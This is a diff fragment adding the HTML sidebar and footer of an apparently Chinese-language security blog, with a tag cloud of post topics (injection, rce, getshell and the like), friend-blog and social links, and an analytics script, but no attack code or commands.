+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/csrf" title="csrf">csrf</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/des" title="des">des</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/deserialize" title="deserialize">deserialize</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/dmz" title="dmz">dmz</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/docker" title="docker">docker</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/fileupload" title="fileupload">fileupload</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/getshell" title="getshell">getshell</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/git" title="git">git</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/https" title="https">https</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/injection" title="injection">injection</a>
+                <sup>18</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/intranet" title="intranet">intranet</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/javascript" title="javascript">javascript</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/linux" title="linux">linux</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/mindmap" title="mindmap">mindmap</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/miscellanea" title="miscellanea">miscellanea</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/module" title="module">module</a>
+                <sup>12</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/mongodb" title="mongodb">mongodb</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/mysql" title="mysql">mysql</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/oracle" title="oracle">oracle</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/pentest" title="pentest">pentest</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/php" title="php">php</a>
+                <sup>12</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/poc" title="poc">poc</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/postgresql" title="postgresql">postgresql</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/python" title="python">python</a>
+                <sup>30</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/rce" title="rce">rce</a>
+                <sup>6</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/redis" title="redis">redis</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/server" title="server">server</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/software" title="software">software</a>
+                <sup>8</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/sqlserver" title="sqlserver">sqlserver</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/ssh%e9%9a%a7%e9%81%93" title="ssh隧道">ssh隧道</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/ssrf" title="ssrf">ssrf</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/thread" title="thread">thread</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/tools" title="tools">tools</a>
+                <sup>11</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/tornado" title="tornado">tornado</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/wireless" title="wireless">wireless</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/xml" title="xml">xml</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/xss" title="xss">xss</a>
+                <sup>4</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" title="代码审计">代码审计</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e5%8f%8d%e5%bc%b9shell" title="反弹shell">反弹shell</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" title="操作系统">操作系统</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="敏感信息泄露">敏感信息泄露</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" title="文件包含">文件包含</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e6%ad%a3%e5%88%99" title="正则">正则</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e7%88%86%e7%a0%b4" title="爆破">爆破</a>
+                <sup>3</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e7%a4%be%e5%b7%a5" title="社工">社工</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" title="端口转发">端口转发</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87" title="网络设备">网络设备</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e6%9c%ba" title="虚拟机">虚拟机</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" title="逻辑漏洞">逻辑漏洞</a>
+                <sup>2</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e9%87%8d%e5%ae%9a%e5%90%91" title="重定向">重定向</a>
+                <sup>1</sup>
+            </p>
+        
+            <p style="display:inline-block;">
+                <a href="https://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
+                <sup>1</sup>
+            </p>
+        
+    </div>
+
+
+</div>
+
+            
+
+<div style="padding-bottom:10px;">
+    <h2 class="asidetitle">Links</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="http://www.test404.com/" target="_blank">Test404's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="http://zksmile.me/" target="_blank">Zksmile's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="https://y-hkl.github.io/" target="_blank">Y-HKL's Blog</a>
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-link fa-fw"></i><a href="https://s.yl0.org/" target="_blank">sòng•sec</a>
+        </li>
+    </ul>
+</div>
+
+            
+<div style="padding-bottom:10px;">
+    <h2 class="asidetitle">Social</h2>
+    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
+        <li style="list-style-type:none;">
+            
+                <i class="fa fa-github-square fa-fw"></i><a href="https://github.com/reber0" target="_blank">GitHub</a>
+            
+        </li>
+        <li style="list-style-type:none;">
+            
+                <i class="fa fa-weibo fa-fw"></i><a href="http://weibo.com/u/5819760166" target="_blank">Weibo</a>
+            
+        </li>
+        <li style="list-style-type:none;">
+            <i class="fa fa-rss fa-fw"></i><a href="https://wyb0.com/index.xml" target="_blank">RSS</a>
+        </li>
+    </ul>
+</div>
+        </div>
+    </div>
+
+    <br><br>
+    
+<div class="foot">
+    <div class="copyright">
+        
+        Copyright &copy; 2015-<script>var d=new Date();document.write(d.getFullYear());</script> Reber. All Rights Reserved.
+
+        
+        <script type="text/javascript" src="https://js.users.51.la/20938483.js"></script>
+    </div>
+    <script>$('.copyright img').remove();</script>
+</div>
+</div>
+
+    
+    <div class="goToTop">
+      <a href="#top" id="goToTop">
+        <img src="https://wyb0.com/img/goto_top.png" alt="可以返回顶部" title="回到顶部"/>
+      </a>
+    </div>
+
+    <script src="/js/style.js"></script>
+
+    
+    
+
+</body>
+</html>
